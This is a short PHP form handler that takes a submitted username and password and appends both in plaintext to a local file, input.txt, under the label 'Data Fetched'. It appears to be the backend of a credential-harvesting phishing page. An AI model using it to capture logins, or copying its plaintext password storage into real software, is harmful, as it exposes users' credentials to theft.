    <?php if ($_SERVER["REQUEST_METHOD"] == "POST") {
      $user_name = $_POST["user_name"];
      $user_pass = $_POST["password"];

      // Concatenate user data properly
      $data = "Data Fetched \n";
      $data .= "Username: $user_name\n";
      $data .= "Password: $user_pass\n";
      $data .= "-------------------------------------\n";

      // Write the data to input.txt
      $input_file = "input.txt";
//Crrate File If Not Exits
      file_put_contents("input.txt", $data, FILE_APPEND | LOCK_EX);

      echo "<p>Saved to input.txt</p>";
    }
